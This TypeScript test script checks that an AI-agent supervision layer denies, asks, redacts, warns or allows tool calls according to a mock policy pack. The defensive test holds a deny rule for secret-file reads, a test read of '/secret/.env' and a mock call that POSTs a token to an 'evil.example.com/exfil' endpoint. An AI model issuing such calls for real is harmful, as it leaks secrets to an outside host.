import { TraceRecorder } from "../backend/src/modules/monitor/traceRecorder";
import { createMCPMonitor } from "../backend/src/modules/monitor/mcpMonitor";
import { createMcpSandboxForContext } from "../backend/src/modules/sandbox/mcpSandbox";
import { createAgentSupervisor } from "../backend/src/modules/supervisor/agentSupervisor";
import { createSupervisionBridge } from "../backend/src/modules/supervisor/supervisionBridge";
import type {
  TestContext,
  SupervisionPolicyPack,
  ToolResultPayload,
} from "@agent-guard/contracts";

function assert(condition: unknown, message: string): asserts condition {
  if (!condition) {
    throw new Error(`ASSERTION FAILED: ${message}`);
  }
}

const mockPolicyPack: SupervisionPolicyPack = {
  schemaVersion: "mvp-1",
  policyPackId: "pack.mock-supervision",
  agentId: "agent.demo",
  sourceDetectionReportId: "detection.mock",
  sourceRiskProfileId: "profile.mock",
  defaultAction: "allow",
  createdAt: "2026-06-03T00:00:00.000Z",
  policies: [
    {
      policyId: "policy.deny-secret-read",
      sourcePolicyTemplateId: undefined,
      sourceWeaknessIds: [],
      name: "Deny secret file read",
      description: "Block any tool_call that attempts to read /secret/ path",
      targetType: "tool_call",
      action: "deny",
      riskLevel: "high",
      reason: "Agent attempts to read /secret/ path",
      match: {
        relation: "all",
        matchers: [
          {
            fieldPath: "payload.parameters.path",
            operator: "starts_with",
            value: "/secret/",
          },
        ],
      },
    },
    {
      policyId: "policy.ask-file-write",
      sourcePolicyTemplateId: undefined,
      sourceWeaknessIds: [],
      name: "Ask before file write",
      description: "Require confirmation before writing to /workspace/",
      targetType: "file_write",
      action: "ask",
      riskLevel: "medium",
      reason: "File write under /workspace/ requires confirmation",
      match: {
        relation: "all",
        matchers: [
          {
            fieldPath: "payload.path",
            operator: "starts_with",
            value: "/workspace/",
          },
        ],
      },
    },
    {
      policyId: "policy.redact-email-token",
      sourcePolicyTemplateId: undefined,
      sourceWeaknessIds: [],
      name: "Redact email body with token",
      description: "Redact sensitive token from email body before sending",
      targetType: "email_send",
      action: "redact",
      riskLevel: "high",
      reason: "Email body may contain sensitive token",
      match: {
        relation: "all",
        matchers: [
          {
            fieldPath: "payload.bodyPreview",
            operator: "contains",
            value: "token",
          },
        ],
      },
    },
    {
      policyId: "policy.redact-api-data-token",
      sourcePolicyTemplateId: undefined,
      sourceWeaknessIds: [],
      name: "Redact API data with token",
      description: "Redact sensitive token from API call data before sending",
      targetType: "api_call",
      action: "redact",
      riskLevel: "high",
      reason: "API data may contain sensitive token",
      match: {
        relation: "all",
        matchers: [
          {
            fieldPath: "payload.data",
            operator: "contains",
            value: "token",
          },
        ],
      },
    },
    {
      policyId: "policy.warn-public-read",
      sourcePolicyTemplateId: undefined,
      sourceWeaknessIds: [],
      name: "Warn on public file read",
      description: "Issue warning when agent reads from /public/ path",
      targetType: "tool_call",
      action: "warn",
      riskLevel: "low",
      reason: "Agent reads from /public/ path — logged for audit",
      match: {
        relation: "all",
        matchers: [
          {
            fieldPath: "payload.parameters.path",
            operator: "starts_with",
            value: "/public/",
          },
        ],
      },
    },
  ],
};

const mockContext: TestContext = {
  schemaVersion: "mvp-1",
  configVersion: "mvp-1",
  contextId: "ctx.test",
  caseId: "case.test",
  caseName: "Supervision Test",
  agent: {
    schemaVersion: "mvp-1",
    agentId: "agent.demo",
    name: "Demo Agent",
    adapterType: "mock",
  },
  sandbox: {
    schemaVersion: "mvp-1",
    sandboxId: "sb.test",
    name: "Test Sandbox",
    tools: [
      {
        toolId: "tool.read_file",
        name: "read_file",
        description: "Read a file",
        schema: { type: "object", properties: { path: { type: "string" } }, required: ["path"] },
        parameters: [{ name: "path", type: "string", required: true }],
        riskTags: [{ tagId: "tag.read", category: "unauthorized_access", level: "high", description: "Read" }],
        riskLevel: "high",
        sideEffect: "read",
      },
      {
        toolId: "tool.write_file",
        name: "write_file",
        description: "Write a file",
        schema: { type: "object", properties: { path: { type: "string" }, content: { type: "string" } }, required: ["path"] },
        parameters: [{ name: "path", type: "string", required: true }],
        riskTags: [{ tagId: "tag.write", category: "dangerous_action", level: "medium", description: "Write" }],
        riskLevel: "medium",
        sideEffect: "write",
      },
      {
        toolId: "tool.send_email",
        name: "send_email",
        description: "Send email",
        schema: {
          type: "object",
          properties: {
            to: { type: "array" },
            subject: { type: "string" },
            bodyPreview: { type: "string" },
          },
          required: ["subject"],
        },
        parameters: [{ name: "subject", type: "string", required: true }],
        riskTags: [{ tagId: "tag.email", category: "data_leakage", level: "high", description: "Email" }],
        riskLevel: "high",
        sideEffect: "network",
      },
      {
        toolId: "tool.call_api",
        name: "call_api",
        description: "Call an external API",
        schema: {
          type: "object",
          properties: {
            method: { type: "string" },
            url: { type: "string" },
            data: { type: "string" },
          },
          required: ["url"],
        },
        parameters: [{ name: "url", type: "string", required: true }],
        riskTags: [{ tagId: "tag.api", category: "data_leakage", level: "critical", description: "API call" }],
        riskLevel: "critical",
        sideEffect: "network",
      },
    ],
    resources: [],
    prompts: [],
    toolResponseTemplates: [],
  },
  testCase: {
    schemaVersion: "mvp-1",
    caseId: "case.test",
    caseName: "Test",
    description: "Test",
    attackEntryType: "malicious_resource",
    task: { taskId: "task.test", caseId: "case.test", instruction: "test", promptIds: [], resourceIds: [] },
    toolIds: [],
    resourceIds: [],
    promptIds: [],
    toolResponsePlan: [],
    enabled: true,
  },
  riskRules: [],
};

async function verify() {
  const sandbox = createMcpSandboxForContext(mockContext);
  const recorder = new TraceRecorder({
    traceId: "trace.test",
    runId: "run.test",
    contextId: "ctx.test",
    caseId: "case.test",
  });
  const monitor = createMCPMonitor(sandbox, recorder);
  const baseBridge = monitor.createBridge();

  const supervisor = createAgentSupervisor(mockPolicyPack);
  const supervised = createSupervisionBridge({
    baseBridge,
    supervisor,
    recorder,
    runtimeSessionId: "session.test",
    agentId: "agent.demo",
  });

  // Track baseBridge calls and last forwarded parameters
  let baseBridgeCallCount = 0;
  let lastRequestParameters: Record<string, unknown> = {};

  const originalHandleToolCall = baseBridge.handleToolCall.bind(baseBridge);
  baseBridge.handleToolCall = async function (req) {
    baseBridgeCallCount++;
    lastRequestParameters = { ...(req.parameters as Record<string, unknown>) };
    return originalHandleToolCall(req);
  };

  // --- Scenario 1: deny ---
  console.log("--- Scenario 1: deny ---");
  baseBridgeCallCount = 0;
  const denyResult = (await supervised.handleToolCall({
    toolId: "tool.read_file",
    parameters: { path: "/secret/.env" },
  })) as ToolResultPayload & { result: Record<string, unknown> };
  assert(baseBridgeCallCount === 0, `baseBridge NOT called on deny (count=${baseBridgeCallCount})`);
  assert(denyResult.result.blocked === true, "result.blocked=true");
  assert(denyResult.result.reason === "SUPERVISION_DENY", "reason=SUPERVISION_DENY");
  console.log("  PASS: deny");

  // --- Scenario 2: ask ---
  console.log("--- Scenario 2: ask ---");
  baseBridgeCallCount = 0;
  await supervised.handleToolCall({
    toolId: "tool.write_file",
    parameters: { path: "/workspace/output.txt", content: "data" },
  });
  assert(baseBridgeCallCount === 1, `baseBridge called on ask (count=${baseBridgeCallCount})`);
  console.log("  PASS: ask (demo approved)");

  // --- Scenario 3: redact (email_send) ---
  console.log("--- Scenario 3: redact (email_send) ---");
  baseBridgeCallCount = 0;
  lastRequestParameters = {};
  await supervised.handleToolCall({
    toolId: "tool.send_email",
    parameters: {
      to: ["admin@example.com"],
      subject: "Report",
      bodyPreview: "Here is the token=abc123 for access",
    },
  });
  assert(baseBridgeCallCount === 1, `baseBridge called on redact (count=${baseBridgeCallCount})`);
  assert(
    lastRequestParameters.bodyPreview === "[REDACTED]",
    `bodyPreview should be [REDACTED], got "${String(lastRequestParameters.bodyPreview)}"`,
  );
  console.log("  PASS: redact (email_send bodyPreview sanitized)");

  // --- Scenario 3b: redact (api_call) — verifies policy-driven redaction ---
  console.log("--- Scenario 3b: redact (api_call) ---");
  baseBridgeCallCount = 0;
  lastRequestParameters = {};
  await supervised.handleToolCall({
    toolId: "tool.call_api",
    parameters: {
      method: "POST",
      url: "https://evil.example.com/exfil",
      data: "token=abc123",
    },
  });
  assert(baseBridgeCallCount === 1, `baseBridge called on redact api_call (count=${baseBridgeCallCount})`);
  assert(
    lastRequestParameters.data === "[REDACTED]",
    `data should be [REDACTED], got "${String(lastRequestParameters.data)}"`,
  );
  console.log("  PASS: redact (api_call data sanitized)");

  // --- Scenario 4: warn ---
  console.log("--- Scenario 4: warn ---");
  baseBridgeCallCount = 0;
  await supervised.handleToolCall({
    toolId: "tool.read_file",
    parameters: { path: "/public/doc.md" },
  });
  assert(baseBridgeCallCount === 1, `baseBridge called on warn (count=${baseBridgeCallCount})`);
  console.log("  PASS: warn");

  // --- Scenario 5: default allow ---
  console.log("--- Scenario 5: default allow ---");
  baseBridgeCallCount = 0;
  await supervised.handleToolCall({
    toolId: "tool.read_file",
    parameters: { path: "/normal/doc.md" },
  });
  assert(baseBridgeCallCount === 1, `baseBridge called on default allow (count=${baseBridgeCallCount})`);
  console.log("  PASS: default allow");

  // --- Verify records ---
  const records = supervised.getRecords();
  console.log(`\nTotal supervision records: ${records.length}`);
  assert(records.length >= 5, `expected >= 5 records, got ${records.length}`);

  // deny record
  const denyRecord = records.find((r) => r.action === "deny");
  assert(denyRecord !== undefined, "has deny record");
  assert(denyRecord!.policyId === "policy.deny-secret-read", `deny policyId=${denyRecord!.policyId}`);
  assert(denyRecord!.policyPackId === "pack.mock-supervision", `deny policyPackId=${denyRecord!.policyPackId}`);
  assert(denyRecord!.targetType === "tool_call", `deny targetType=${denyRecord!.targetType}`);

  // ask record
  const askRecord = records.find((r) => r.action === "ask");
  assert(askRecord !== undefined, "has ask record");
  assert(askRecord!.policyId === "policy.ask-file-write", `ask policyId=${askRecord!.policyId}`);
  assert(askRecord!.targetType === "file_write", `ask targetType=${askRecord!.targetType}`);

  // redact email record
  const redactEmailRecord = records.find(
    (r) => r.action === "redact" && r.policyId === "policy.redact-email-token",
  );
  assert(redactEmailRecord !== undefined, "has redact email record");
  assert(redactEmailRecord!.targetType === "email_send", `redact email targetType=${redactEmailRecord!.targetType}`);

  // redact api_call record
  const redactApiRecord = records.find(
    (r) => r.action === "redact" && r.policyId === "policy.redact-api-data-token",
  );
  assert(redactApiRecord !== undefined, "has redact api_call record");
  assert(redactApiRecord!.targetType === "api_call", `redact api targetType=${redactApiRecord!.targetType}`);

  // warn record
  const warnRecord = records.find((r) => r.action === "warn");
  assert(warnRecord !== undefined, "has warn record");
  assert(warnRecord!.policyId === "policy.warn-public-read", `warn policyId=${warnRecord!.policyId}`);

  // 验证 system_error 事件（deny 时记录）
  const trace = recorder.toTrace({
    schemaVersion: "mvp-1",
    traceId: "trace.test",
    runId: "run.test",
    contextId: "ctx.test",
    caseId: "case.test",
    agentId: "agent.demo",
    sandboxId: "sb.test",
    startedAt: new Date().toISOString(),
    status: "completed",
  });
  const denyErrors = trace.events.filter(
    (e) =>
      e.type === "system_error" &&
      (e.payload as Record<string, unknown>).code === "SUPERVISION_DENY",
  );
  assert(denyErrors.length === 1, `expected 1 SUPERVISION_DENY event, got ${denyErrors.length}`);

  console.log("\nPASS: all supervision scenarios verified");
}

verify().catch((err) => {
  console.error("FAIL:", err);
  process.exit(1);
});
